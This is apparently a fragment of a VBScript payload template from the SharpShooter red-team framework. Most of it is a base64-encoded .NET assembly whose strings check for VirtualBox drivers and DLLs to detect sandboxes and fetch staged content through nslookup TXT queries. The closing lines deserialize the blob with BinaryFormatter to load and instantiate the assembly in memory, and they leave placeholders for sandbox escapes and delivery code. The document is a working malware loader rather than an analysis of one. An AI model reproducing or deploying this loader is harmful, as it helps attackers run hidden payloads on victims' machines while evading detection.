serialized_obj = serialized_obj & "bwB3AHMAXABTAHkAcwBuAGEAdABpAHYAZQBcAEQAcgBpAHYAZQByAHMAXABWAEIAbwB4AEcAdQBl"
serialized_obj = serialized_obj & "AHMAdAAuAHMAeQBzAABPQwA6AFwAdwBpAG4AZABvAHcAcwBcAFMAeQBzAG4AYQB0AGkAdgBlAFwA"
serialized_obj = serialized_obj & "RAByAGkAdgBlAHIAcwBcAFYAQgBvAHgAUwBGAC4AcwB5AHMAAFVDADoAXAB3AGkAbgBkAG8AdwBz"
serialized_obj = serialized_obj & "AFwAUwB5AHMAbgBhAHQAaQB2AGUAXABEAHIAaQB2AGUAcgBzAFwAVgBCAG8AeABWAGkAZABlAG8A"
serialized_obj = serialized_obj & "LgBzAHkAcwAAQ0MAOgBcAHcAaQBuAGQAbwB3AHMAXABTAHkAcwBuAGEAdABpAHYAZQBcAHYAYgBv"
serialized_obj = serialized_obj & "AHgAZABpAHMAcAAuAGQAbABsAABDQwA6AFwAdwBpAG4AZABvAHcAcwBcAFMAeQBzAG4AYQB0AGkA"
serialized_obj = serialized_obj & "dgBlAFwAdgBiAG8AeABoAG8AbwBrAC4AZABsAGwAAEVDADoAXAB3AGkAbgBkAG8AdwBzAFwAUwB5"
serialized_obj = serialized_obj & "AHMAbgBhAHQAaQB2AGUAXAB2AGIAbwB4AG0AcgB4AG4AcAAuAGQAbABsAABBQwA6AFwAdwBpAG4A"
serialized_obj = serialized_obj & "ZABvAHcAcwBcAFMAeQBzAG4AYQB0AGkAdgBlAFwAdgBiAG8AeABvAGcAbAAuAGQAbABsAABRQwA6"
serialized_obj = serialized_obj & "AFwAdwBpAG4AZABvAHcAcwBcAFMAeQBzAG4AYQB0AGkAdgBlAFwAdgBiAG8AeABvAGcAbABhAHIA"
serialized_obj = serialized_obj & "cgBhAHkAcwBwAHUALgBkAGwAbAAATUMAOgBcAHcAaQBuAGQAbwB3AHMAXABTAHkAcwBuAGEAdABp"
serialized_obj = serialized_obj & "AHYAZQBcAHYAYgBvAHgAbwBnAGwAYwByAHUAdABpAGwALgBkAGwAbAAAUUMAOgBcAHcAaQBuAGQA"
serialized_obj = serialized_obj & "bwB3AHMAXABTAHkAcwBuAGEAdABpAHYAZQBcAHYAYgBvAHgAbwBnAGwAZQByAHIAbwByAHMAcAB1"
serialized_obj = serialized_obj & "AC4AZABsAGwAAFdDADoAXAB3AGkAbgBkAG8AdwBzAFwAUwB5AHMAbgBhAHQAaQB2AGUAXAB2AGIA"
serialized_obj = serialized_obj & "bwB4AG8AZwBsAGYAZQBlAGQAYgBhAGMAawBzAHAAdQAuAGQAbABsAABPQwA6AFwAdwBpAG4AZABv"
serialized_obj = serialized_obj & "AHcAcwBcAFMAeQBzAG4AYQB0AGkAdgBlAFwAdgBiAG8AeABvAGcAbABwAGEAYwBrAHMAcAB1AC4A"
serialized_obj = serialized_obj & "ZABsAGwAAF1DADoAXAB3AGkAbgBkAG8AdwBzAFwAUwB5AHMAbgBhAHQAaQB2AGUAXAB2AGIAbwB4"
serialized_obj = serialized_obj & "AG8AZwBsAHAAYQBzAHMAdABoAHIAbwB1AGcAaABzAHAAdQAuAGQAbABsAABJQwA6AFwAdwBpAG4A"
serialized_obj = serialized_obj & "ZABvAHcAcwBcAFMAeQBzAG4AYQB0AGkAdgBlAFwAdgBiAG8AeABzAGUAcgB2AGkAYwBlAC4AZQB4"
serialized_obj = serialized_obj & "AGUAAENDADoAXAB3AGkAbgBkAG8AdwBzAFwAUwB5AHMAbgBhAHQAaQB2AGUAXAB2AGIAbwB4AHQA"
serialized_obj = serialized_obj & "cgBhAHkALgBlAHgAZQAASUMAOgBcAHcAaQBuAGQAbwB3AHMAXABTAHkAcwBuAGEAdABpAHYAZQBc"
serialized_obj = serialized_obj & "AFYAQgBvAHgAQwBvAG4AdAByAG8AbAAuAGUAeABlAAANMAAwADAAQwAyADkAAA0wADAAMQBDADEA"
serialized_obj = serialized_obj & "NAAADTAAMAA1ADAANQA2AAANMAAwADAANQA2ADkAAA0wADgAMAAwADIANwAACS4AewAyAH0AAAck"
serialized_obj = serialized_obj & "ADAAOgAAAywAABVVAHMAZQByAC0AQQBnAGUAbgB0AAGAi00AbwB6AGkAbABsAGEALwA1AC4AMAAg"
serialized_obj = serialized_obj & "ACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADEAMAAuADAAOwAgAFcATwBXADYANAA7ACAAVAByAGkA"
serialized_obj = serialized_obj & "ZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBv"
serialized_obj = serialized_obj & "AAA9ewAwAH0AXABzACoAdABlAHgAdAAgAD0AXABzACoAKABbACIAXQApACgALgAqAD8AKQAoAFsA"
serialized_obj = serialized_obj & "IgBdACkAAB8oAFsAIgBdACkAKAAuACoAPwApACgAWwAiAF0AKQAAEW4AcwBsAG8AbwBrAHUAcAAA"
serialized_obj = serialized_obj & "Qy0AdAB5AHAAZQA9AFQAWABUACAALQByAGUAdAByAHkAPQAzACAALQB0AGkAbQBlAG8AdQB0AD0A"
serialized_obj = serialized_obj & "NgAgAHsAMAB9AAEDIgAABTAALgAAAzsAAAMuAAAfQwBvAG0AcABpAGwAZQByAFYAZQByAHMAaQBv"
serialized_obj = serialized_obj & "AG4AAAl2ADQALgAwAAArLwB1AG4AcwBhAGYAZQAgAC8AcABsAGEAdABmAG8AcgBtADoAeAA2ADQA"
serialized_obj = serialized_obj & "AAlUAGUAbQBwAAAhRQByAHIAbwByACAAKAB7ADAAfQApADoAIAB7ADEAfQAAUyXB8CxoSk6lCx5u"
serialized_obj = serialized_obj & "pQWMcgAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBQAAEoCBAyAADggAAwIODhGAiQsHBBUSRQEO"
serialized_obj = serialized_obj & "HQ4IDgUVEkUBDgQAAQIOBSABARMAAyAACBMHCBUSRQEOHQ4dEkkIEkkdDggOBQAAHRJJBSAAEoCR"
serialized_obj = serialized_obj & "BCABAg4GAAMODg4OBSABDh0DAwAAAgQHARIIBAABAQgGBwISDB0OBCAAHQMJIAIdDh0DEYClBAcB"
serialized_obj = serialized_obj & "HQUFIAASgK0FIAIBDg4EIAEODgUAAR0FDgoHBg4ODg4SURJVBQACDg4cBiABARGAvQcAARJVEoC5"
serialized_obj = serialized_obj & "BSAAEoDBCQADElEODhGAyQMgAAIFIAASgNEGIAESgM0IAgYOBSACDg4OCAcFDggOHQUIBQACDg4O"
serialized_obj = serialized_obj & "BSACCA4IBSACDggIBAABCA4FBwIdBQgHIAMBHQUICAcgAwgdBQgICQcEEl0SXRJhDgUgAQEdBQgg"
serialized_obj = serialized_obj & "AgESWRGA4QUAABKA5QQgAB0FBSABDh0FFgcMEmUSaQ4OEm0dDggOEnESdRJ5En0HFRKA6QIODgcg"
serialized_obj = serialized_obj & "AgETABMBCiABARUSgO0CDg4FIAASgPEEIAEIDgYAAQ4RgPUFIAIBDgIGIAEBEoD9CCACEm0SaR0O"
serialized_obj = serialized_obj & "BSAAEoEFBCAAEnUDIAAcBgADDg4cHAUgARJxDgUgABKBEQYgARKBFQ4GIAESgRkOBiACHBwdHAi3"
serialized_obj = serialized_obj & "elxWGTTgiQUgAgEIDgggBQEODg4IDgcgAgESWRJZCSAFAR0ODg4CDggBAAgAAAAAAB4BAAEAVAIW"
serialized_obj = serialized_obj & "V3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAZAQAUU2hhcnBTaG9vdGVyQXNzZW1ibHkA"
serialized_obj = serialized_obj & "ACIBAB1TaGFycFNob290ZXIgUGF5bG9hZCBEZWxpdmVyeQAABQEAAAAAFwEAEk1EU2VjIEFjdGl2"
serialized_obj = serialized_obj & "ZUJyZWFjaAAAJwEAIkNvcHlyaWdodCDCqSBNRFNlYyBDb25zdWx0aW5nIDIwMTcAACkBACQ1NjU5"
serialized_obj = serialized_obj & "OGYxYy02ZDg4LTQ5OTQtYTM5Mi1hZjMzN2FiZTU3NzcAAAwBAAcxLjAuMC4wAABHAQAaLk5FVEZy"
serialized_obj = serialized_obj & "YW1ld29yayxWZXJzaW9uPXY0LjABAFQOFEZyYW1ld29ya0Rpc3BsYXlOYW1lEC5ORVQgRnJhbWV3"
serialized_obj = serialized_obj & "b3JrIDQFAQABAAAAAAAAAAAci+xhAAAAAAIAAAAcAQAAJEgAACQqAABSU0RT0khmYKz4sUyLkUtR"
serialized_obj = serialized_obj & "++PBKAEAAABcXDE5Mi4xNjguNTYuMTg3XHZpc3VhbHN0dWRpb1xyZXBvc1xTdXBlclNoYXJwU2hv"
serialized_obj = serialized_obj & "b3RlclxDU2hhcnBTaG9vdGVydjRcb2JqXHg2NFxSZWxlYXNlXFNoYXJwU2hvb3RlckFzc2VtYmx5"
serialized_obj = serialized_obj & "LnBkYgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAMAAAgAAAAAAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAQAAAAAASAAAAFhgAAD4AwAAAAAAAAAAAAD4AzQAAABWAFMAXwBWAEUAUgBTAEkA"
serialized_obj = serialized_obj & "TwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAgAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEA"
serialized_obj = serialized_obj & "bgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEWAMAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBv"
serialized_obj = serialized_obj & "AAAANAMAAAEAMAAwADAAMAAwADQAYgAwAAAAVAAeAAEAQwBvAG0AbQBlAG4AdABzAAAAUwBoAGEA"
serialized_obj = serialized_obj & "cgBwAFMAaABvAG8AdABlAHIAIABQAGEAeQBsAG8AYQBkACAARABlAGwAaQB2AGUAcgB5AAAARgAT"
serialized_obj = serialized_obj & "AAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAABNAEQAUwBlAGMAIABBAGMAdABpAHYAZQBCAHIA"
serialized_obj = serialized_obj & "ZQBhAGMAaAAAAAAAUgAVAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAFMAaABh"
serialized_obj = serialized_obj & "AHIAcABTAGgAbwBvAHQAZQByAEEAcwBzAGUAbQBiAGwAeQAAAAAAMAAIAAEARgBpAGwAZQBWAGUA"
serialized_obj = serialized_obj & "cgBzAGkAbwBuAAAAAAAxAC4AMAAuADAALgAwAAAAUgAZAAEASQBuAHQAZQByAG4AYQBsAE4AYQBt"
serialized_obj = serialized_obj & "AGUAAABTAGgAYQByAHAAUwBoAG8AbwB0AGUAcgBBAHMAcwBlAG0AYgBsAHkALgBkAGwAbAAAAAAA"
serialized_obj = serialized_obj & "aAAiAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACp"
serialized_obj = serialized_obj & "ACAATQBEAFMAZQBjACAAQwBvAG4AcwB1AGwAdABpAG4AZwAgADIAMAAxADcAAAAqAAEAAQBMAGUA"
serialized_obj = serialized_obj & "ZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAFoAGQABAE8AcgBpAGcAaQBuAGEAbABG"
serialized_obj = serialized_obj & "AGkAbABlAG4AYQBtAGUAAABTAGgAYQByAHAAUwBoAG8AbwB0AGUAcgBBAHMAcwBlAG0AYgBsAHkA"
serialized_obj = serialized_obj & "LgBkAGwAbAAAAAAASgAVAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABTAGgAYQByAHAAUwBo"
serialized_obj = serialized_obj & "AG8AbwB0AGUAcgBBAHMAcwBlAG0AYgBsAHkAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIA"
serialized_obj = serialized_obj & "cwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBz"
serialized_obj = serialized_obj & "AGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5"
serialized_obj = serialized_obj & "IExvYWQoQnl0ZVtdKQgAAAAKCwAA"
entry_class = "SharpShooter"

Dim fmt, al, d, o
Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
Set al = CreateObject("System.Collections.ArrayList")
al.Add fmt.SurrogateSelector

Set d = fmt.Deserialize_2(Base64ToStream(s))
Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)

%SANDBOX_ESCAPES%
%DELIVERY%

End Sub

SetVersion
On Error Resume Next
Run
If Err.Number <> 0 Then
  DebugPrint Err.Description
  Err.Clear
End If